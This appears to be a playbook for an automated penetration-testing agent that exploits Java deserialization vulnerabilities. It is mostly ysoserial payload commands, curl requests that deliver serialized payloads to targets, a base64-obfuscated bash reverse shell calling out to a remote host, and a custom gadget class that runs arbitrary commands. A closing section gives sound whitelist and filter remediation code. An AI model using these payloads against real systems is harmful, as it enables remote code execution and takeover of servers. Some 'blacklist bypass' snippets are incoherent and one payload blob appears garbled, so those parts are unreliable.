# Agent-0016: Java Deserialization & Gadget Chain Exploitation

## 🎯 Objectives

Identify and exploit Java object deserialization vulnerabilities using gadget chains:
- ysoserial gadget chain exploitation
- Custom gadget chain discovery
- RCE through deserialization
- Blacklist bypass techniques
- Remote class loading exploitation

## 📋 Scope & Dependencies

**Depends On**:
- Agent-001 (Reconnaissance)
- Agent-003A (REST API)
- Agent-0013 (Deserialization RCE - basic)

**Tools Required**:
- `ysoserial` (gadget chain generator)
- `jexboss` (JBoss exploitation)
- `marshalsec` (Java deserialization)
- `java` compiler
- `burp-suite`
- Frida (runtime instrumentation)
- Custom Python/Java scripts

## 🔍 Testing Techniques

### 1. Deserialization Endpoint Discovery
```bash
# Look for serialized Java objects
# Base64-encoded serialized objects often start with rO0AB (hex: ac ed)

# Search HTTP requests for magic bytes
curl -s https://target.api/endpoint | xxd | grep "aced"

# Test common serialization parameters
curl -X POST https://target.api/upload \
  -d 'data=rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSMLR6O7MCAABJAARzaXpleAAAAAAAAAABTAAGYXJyYXl0ABBbTGphdmEvbGFuZy9PYmplY3Q7eHAAAAABc3IAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzAgAAeHAAAAAEdGVzdA=='
```

### 2. ysoserial Gadget Chain Generation

#### Common Gadget Chains
```bash
# CommonsCollections - Most reliable
ysoserial CommonsCollections5 'id' | base64

# CommonsCollections1 (Java 8u71-)
ysoserial CommonsCollections1 'id' | base64

# Spring1 (Spring Framework)
ysoserial Spring1 'id' | base64

# JDK7u21 (Java 7 Update 21-)
ysoserial JDK7u21 'id' | base64

# Rome (XBean dependency)
ysoserial Rome 'id' | base64
```

#### Payload Generation
```bash
# Generate reverse shell payload
COMMAND="bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"

# Generate gadget chain
ysoserial CommonsCollections5 "$COMMAND" > payload.bin

# Encode as Base64
cat payload.bin | base64 > payload.b64
```

### 3. Exploiting Deserialization Endpoints

#### HTTP POST with Serialized Object
```bash
# POST serialized payload
PAYLOAD=$(ysoserial CommonsCollections5 'touch /tmp/pwned' | base64 -w0)

curl -X POST https://target.api/process \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "X-Serialized-Object: $PAYLOAD" \
  --data-binary @payload.bin
```

#### SOAP/XML-RPC Services
```bash
# SOAP with base64-encoded payload
curl -X POST https://target.api/soap \
  -H "Content-Type: application/soap+xml" \
  -d '<soap:Envelope>
    <soap:Body>
      <m:Process>
        <payload>rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0...</payload>
      </m:Process>
    </soap:Body>
  </soap:Envelope>'
```

### 4. Blacklist Bypass Techniques

#### Class Name Obfuscation
```java
// Vulnerable: Simple blacklist check
if (blacklist.contains(className)) {
    throw new ClassNotFoundException("Blocked");
}

// Bypass: Use reflection
ObjectInputStream ois = new ObjectInputStream(input);
String className = "org.apache.commons.collections.Transformer"; // In whitelist
Class<?> clazz = Class.forName(className);

// Alternative: Use Unicode escaping
String obfuscated = "org\\u002eapache\\u002ecommons\\u002ecollections\\u002eTransformer";
```

#### Protocol Wrapper Bypass
```bash
# Use jndi:// instead of direct class reference
PAYLOAD="rO0ABXNyABNjb20uc3VuLm9yZy5hcGFjaGUueG1sLmludGVybmFsLnhtbHRyYXguVGVtcGxhdGVzSW1wbHMBAAZJAA1fY2FsY2lkSW5kZXhJABRfdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AABbW0JbAApfY2xhc3NOYW1lcwR0ABJbTGphdmEvbGFuZy9TdHJpbmc7TAAKX2NsYXNzTG9hZGVydAAyTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwveG1sdHJhY2svVHJhbnNsZXRDbGFzc0xvYWRlcjtMAApfY29uZmlndnR2dAAVTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwveG1sdHJhY2UvVHJhbnNsZXRFeGNlcHRpb24uUGFyZW50Tm9kZVsDD19tdWx0aVBhcmVudHQAK1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kb20vTm9kZTtJAApfb3V0cHV0IHJvcGVydHllcwR0ABVMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////cHB1chADW0L2nPEn2sKwAgAAeHAAAAAAAAJzcHB2cgAXamF2YS5sYW5nLlZpcnR1YWxNYWNoaW5lRgIlxsOBQDAAAAAAAAAA"
```

### 5. Runtime Instrumentation with Frida

```javascript
// Frida script to hook ObjectInputStream.readObject()
Java.perform(function () {
    var ObjectInputStream = Java.use('java.io.ObjectInputStream');
    
    ObjectInputStream.readObject.overload().implementation = function () {
        console.log("[!] readObject called");
        console.log("[*] Stack trace:");
        console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Exception").$new()));
        return this.readObject();
    };
});
```

## 📊 Expected Findings

### Critical Findings
1. **Remote Code Execution via Unsafe Deserialization**
   - CVSS: 9.8 (Critical)
   - Full system compromise possible
   - Gadget chains: CommonsCollections, Spring, Rome

2. **Deserialization without Input Validation**
   - CVSS: 9.2 (Critical)
   - Any serialized object accepted
   - No class whitelisting

### High Findings
3. **Gadget Chains Available (CommonsCollections)**
   - CVSS: 8.6 (High)
   - Standard library enables RCE

4. **Blacklist Bypass via Reflection**
   - CVSS: 8.2 (High)
   - Blacklist-based protection insufficient

## 🛡️ Remediation Code Examples

### Vulnerable Code (Java)
```java
// BAD: Unsafe deserialization
ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
Object obj = ois.readObject(); // ❌ Accepts any serialized object

// Process the object
if (obj instanceof PaymentInfo) {
    processPayment((PaymentInfo) obj);
}
```

### Fixed Code
```java
// GOOD: Whitelist-based deserialization
class WhitelistObjectInputStream extends ObjectInputStream {
    private static final Set<String> WHITELIST = Set.of(
        "com.example.PaymentInfo",
        "com.example.UserData",
        "java.lang.String",
        "java.util.ArrayList"
    );
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {
        if (!WHITELIST.contains(desc.getName())) {
            throw new InvalidClassException("Class not whitelisted: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// Usage
WhitelistObjectInputStream ois = new WhitelistObjectInputStream(input);
Object obj = ois.readObject();

// GOOD: Use JSON instead of Java serialization
import com.google.gson.Gson;

String json = new String(inputData);
PaymentInfo info = new Gson().fromJson(json, PaymentInfo.class);

// GOOD: Remove vulnerable dependencies
// In pom.xml: Remove commons-collections, commons-beanutils, etc.
// Or use serialization filtering (Java 9+)
```

### Java 9+ Serialization Filtering
```java
// Configure deserialization filter
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.lang.String;" +  // Allow String
    "com.example.PaymentInfo;" + // Allow PaymentInfo
    "java.util.ArrayList;" + // Allow ArrayList
    "!*" // Reject everything else
);

ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
Object obj = ois.readObject();
```

## ✅ Success Criteria

- [ ] Deserialization endpoints identified
- [ ] Gadget chains tested (at least 3 different chains)
- [ ] RCE confirmed with command output
- [ ] Blacklist bypass techniques documented
- [ ] Payload generation process captured
- [ ] Clear remediation code provided
- [ ] CVSS scoring justified

## 🔗 Related CVEs & References

- CVE-2015-4852: Java Deserialization RCE
- CVE-2015-6420: WebLogic deserialization
- CVE-2017-9805: REST/JAXB deserialization (Struts2)
- ysoserial: https://github.com/frohoff/ysoserial
- OWASP: Deserialization of Untrusted Data

## 🛠️ Advanced Techniques

### Custom Gadget Chain Development
```java
// If standard chains don't work, develop custom chain
// 1. Identify available classes
// 2. Map method calls that lead to RCE
// 3. Chain them using reflection

public class CustomGadgetChain implements Serializable {
    private String command;
    
    public CustomGadgetChain(String cmd) {
        this.command = cmd;
    }
    
    private void readObject(ObjectInputStream ois) 
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }
}
```

### Third-Party Library Scanning
```bash
# Identify vulnerable libraries
mvn dependency:tree | grep -E "commons-collections|spring|rome|commons-beanutils"

# Use OWASP dependency checker
dependency-check.sh --project "MyProject" --scan .
```
